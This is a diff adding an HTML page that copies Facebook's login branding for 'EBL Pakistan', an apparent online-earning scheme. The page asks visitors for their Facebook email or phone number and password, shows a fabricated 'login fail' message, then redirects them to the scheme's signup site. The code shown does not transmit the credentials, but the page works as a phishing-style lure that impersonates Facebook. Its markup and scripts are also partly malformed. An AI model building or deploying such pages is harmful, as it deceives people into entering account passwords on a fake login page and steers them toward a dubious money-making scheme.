@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login - EBL Pakistan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #041728;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #1877f2;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-family: sans-serif;
+        }
+        
+        .tagline {
+            font-size: 10px;
+            color: #606770;
+            margin-bottom: 20px;
+            font-family:sans-serif;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            text-decoration: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .footer {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 20px;
+        }
+        
+        .ebl-header {
+            background-color: #041728;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .amazing-text {
+    color: #66FCF1; /* Example: Orange (change to any color you want) */
+    /* Optional extras */
+    font-weight: bold;
+    text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
+}
+    </style>
+</head>
+<body>
+    <<div class="ebl-header">
+    EBL PAKISTAN - <span class="amazing-text">Amazing</span> Online Earning
+</div>
+    <div class="login-container">
+        <div class="logo">facebook</div>
+        <div class="subtitle">Connect with EBL Pakistan</div>
+        <div class="tagline">We are an online business provider platform. Login with Facebook to join our network and earn good income.</div>
+        
+        <form class="login-form">
+            <input type="text" placeholder="Email or phone number">
+            <input type="password" placeholder="Password">
+            <button type="submit" class="login-btn">Log In</button>
+            <a href="https://m.facebook.com/login/identify/" class="forgot-password">Forgotten password?</a>
+            <div class="divider"></div>
+            </a>
+            <a href="https://m.facebook.com/reg/"; button type="button" class="create-account">Create New Account</button></a>
+        </form>
+        
+        <div class="footer">
+            By continuing, you agree to our Terms and confirm that you have read our Data Policy.
+        </div>
+    </div>
+    
+    <script>
+document.querySelector('.login-btn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const email = document.querySelector('input[type="text"]').value.trim();
+    const password = document.querySelector('input[type="password"]').value.trim();
+    
+    // Create Facebook-style popup container
+    const popup = document.createElement('div');
+    popup.style.position = 'fixed';
+    popup.style.top = '50%';
+    popup.style.left = '50%';
+    popup.style.transform = 'translate(-50%, -50%)';
+    popup.style.backgroundColor = 'white';
+    popup.style.padding = '20px';
+    popup.style.borderRadius = '8px';
+    popup.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.2)';
+    popup.style.zIndex = '1000';
+    popup.style.width = '300px';
+    popup.style.textAlign = 'center';
+    
+    // Create popup content
+    const popupContent = document.createElement('div');
+    popupContent.style.marginBottom = '20px';
+    
+    const okButton = document.createElement('button');
+    okButton.textContent = 'OK';
+    okButton.style.backgroundColor = '#1877f2';
+    okButton.style.color = 'white';
+    okButton.style.border = 'none';
+    okButton.style.borderRadius = '6px';
+    okButton.style.padding = '8px 20px';
+    okButton.style.fontWeight = 'bold';
+    okButton.style.cursor = 'pointer';
+    
+    okButton.addEventListener('click', function() {
+        document.body.removeChild(popup);
+    });
+    
+    // Enhanced validation logic
+    if (!email && !password) {
+        popupContent.innerHTML = `
+            <h3 style="margin-bottom: 10px; color: #333;">Email address or mobile number required</h3>
+            <p style="color: #606770;">Enter your email address or mobile number to continue.</p>
+        `;
+    } else if (email && !password) {
+        popupContent.innerHTML = `
+            <h3 style="margin-bottom: 10px; color: #333;">Password required</h3>
+            <p style="color: #606770;">Enter your password to continue.</p>
+        `;
+    } else if (!isValidEmail(email) && !isValidPakistanPhone(email)) {  // Changed validation function
+        popupContent.innerHTML = `
+            <h3 style="margin-bottom: 10px; color: #333;">Wrong credentials</h3>
+            <p style="color: #606770;">Invalid username or password.</p>
+        `;
+    } else {
+        // Only redirect if credentials are truly valid
+        window.location.href = "https://eblpakistan.pro/signup/";
+        return;
+    }
+    
+    popup.appendChild(popupContent);
+    popup.appendChild(okButton);
+    document.body.appendChild(popup);
+});
+
+function isValidEmail(email) {
+    // More strict email validation
+    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
+}
+
+function isValidPakistanPhone(phone) {
+    // Strict Pakistan phone number validation (+92 format)
+    return /^(\+92|0092|92|0)[1-9][0-9]{9}$/.test(phone);
+}
+</script>
+<script>
+// Standalone success message handler
+document.querySelector('.login-btn').addEventListener('click', function(e) {
+    // Only trigger if credentials are valid (add this check)
+    const email = document.querySelector('input[type="text"]').value.trim();
+    const password = document.querySelector('input[type="password"]').value.trim();
+    
+    if(email && password && (isValidEmail(email) || isValidPakistanPhone(email))) {
+        e.preventDefault();
+        
+        // Show message after 3 seconds
+        setTimeout(() => {
+            const successMsg = document.createElement('div');
+            successMsg.innerHTML = `
+                <div style="
+                    position: fixed;
+                    bottom: 20px;
+                    left: 50%;
+                    transform: translateX(-50%);
+                    background: #2F2F2F;
+                    color: white;
+                    padding: 5px 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+                    z-index: 1000;
+                    font-family: Arial;
+                    font-size: 12px;
+                    animation: fadeIn 0.5s ease-out;
+                ">
+                     login fail! register your new account...
+                </div>
+            `;
+            document.body.appendChild(successMsg);
+            
+            // Redirect after showing message
+            setTimeout(() => {
+                window.location.href = "https://eblpakistan.pro/signup/";
+            }, 5000); // Additional 5s to see message
+        }, 1000); // Initial 1.5s delay
+    }
+});
+
+// Validation helpers (standalone)
+function isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function isValidPakistanPhone(phone) {
+    return /^(\+92|0092|92)?(0)?(3[0-9]{9})$/.test(phone);
+}
+
+// Add animation style
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes fadeIn {
+        from { opacity: 0; bottom: 10px; }
+        to { opacity: 1; bottom: 20px; }
+    }
+`;
+document.head.appendChild(style);
+</script>
+
+</body>
+</html>
